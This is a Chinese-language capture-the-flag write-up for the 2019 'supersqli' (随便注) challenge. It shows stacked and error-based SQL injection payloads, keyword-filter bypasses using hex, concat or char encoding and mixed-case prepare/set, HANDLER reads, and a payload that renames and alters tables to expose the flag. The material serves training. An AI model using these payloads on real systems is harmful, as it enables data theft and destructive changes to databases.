# supersqli  | 强网杯 2019 随便注



![image-20220602220016590](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602220016590.png)

上来不多说直接测试，这里直接报错

```sql
1' and 1=1#
```



![image-20220602220205878](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602220205878.png)

![image-20220602220247668](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602220247668.png)

尝试另一种注释符号就可以正常注入了

```sql
1' and 1=1 --+
```

```sql
1' and 1=2 --+
```



![image-20220602220356089](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602220356089.png)

直接order by 测试字段数，最多可三列

```sql
1' order by 3#
```



![image-20220602220540117](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602220540117.png)

再尝试select查询，发现被 preg_match函数过滤了这些关键字

```
preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
```







![image-20220602220956608](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602220956608.png)

多试几遍可以发现这个查询语句可以分号隔开，多语句查询的堆叠注入，那就有各种骚操作了

```sql
1';  show databases    ;#
```



![image-20220602221626553](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602221626553.png)

也可以用extractvalue爆库

```sql
1' and extractvalue(1,concat(0x7e,databse())) #
```





这里有个有意思的点， 注释的时候，如果用 # 注释，就需要把分号写上，否则会报错。然而用 --+ 则不会有这种问题

1：![image-20220602222120091](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602222120091.png)

2：

![image-20220602222203218](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602222203218.png)

3：![image-20220602222211612](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602222211612.png)







![image-20220602222507939](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602222507939.png)

接下来就是爆数据表的操作，select会被过滤，可以用show语句查询，执行成功出现两个表，因为已经做过了，所以知道是第一个表也不多浪费时间

```sql
1'; show tables from supersqli --+
```



![image-20220602222943716](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602222943716.png)

还是用show查询表的字段名，这里记得把表名用反引号括上，否则查询不出来，反引号可以让查询的字段不会变成关键字

```sql
1'; show columns from `1919810931114514` --+
```



![image-20220602223038327](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602223038327.png)

或者可以用desc查询表字段

```sql
1'; desc `1919810931114514` --+
```



最后就是各种查flag的操作了，目前已知有三种操作

一是handler查询

>   mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。
>   HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。

这里只做简单介绍，详细了解可以去https://blog.csdn.net/JesseYoung/article/details/40785137



![image-20220602223926943](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220602223926943.png)

payload:

```sql
1'; handler `1919810931114514` open;handler `1919810931114514` read first  --+
```







二是预处理查询

虽然select被过滤，但是可以用set设置变量，这个变量可以编译成16进制、concat构造语句或是ascii码，当然也可以用concat直接构造语句不用设置变量

prepare 是预编译语句，会进行编码转换

最后用execute执行该语句

一个额外的知识点，select可以设置多个变量，而set只能设置一个



这里注意，set与prepare要改改成大写，或者大小写一起，否则会被strstr过滤，这个函数只过滤相应的格式，可以用大小写绕过

![image-20220603101542020](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220603101542020.png)



payload1:

```sql
1';SEt @test=0x73656c656374202a2066726f6d2020603139313938313039333131313435313460; prEpare  payload from @test;execute payload;#
```

payload2:

```sql
1';Set @test=concat('sel','ect * from `1919810931114514`');pREpare payload from @test;execute payload;#
```

payload3:

```sql
1';PrePare payload from 
concat('sel','ect * from `1919810931114514`');execute payload;#
```

payload4:

```sql
1'; Set @test=char(115, 101, 108, 101, 99, 116, 32, 42, 32, 32, 102, 114, 111, 109, 32, 96, 49, 57, 49, 57, 56, 49, 48, 57, 51, 49, 49, 49, 52, 53, 49, 52, 96);PRepare payload from @test;execute payload;#
```







三是最骚的一个操作，把有flag的表数据插到正常查询的表里去



查words这个表可以看到两个字段，猜测查询语句可能为：

```sql
select * from words where id='$id';
```

![image-20220603111006385](C:\Users\86185\AppData\Roaming\Typora\typora-user-images\image-20220603111006385.png)

那么就可以设想一下把数据插到这个表：

```sql
select * from `1919810931114514` where flag='$id';
```



接下来构造payload，将words改成其他表名，把1919810931114514这个表改成words，并添加字段

payload:

```sql
1';
rename table `words` to `another`;
rename table `1919810931114514` to `words`;
alter table `words` change `flag` 
`id` varchar(100) character set utf8 collate utf8_general_ci NOT NULL;#
```





![image-20220603113207316](image-20220603113207316.png)

最后要用万能密码查询

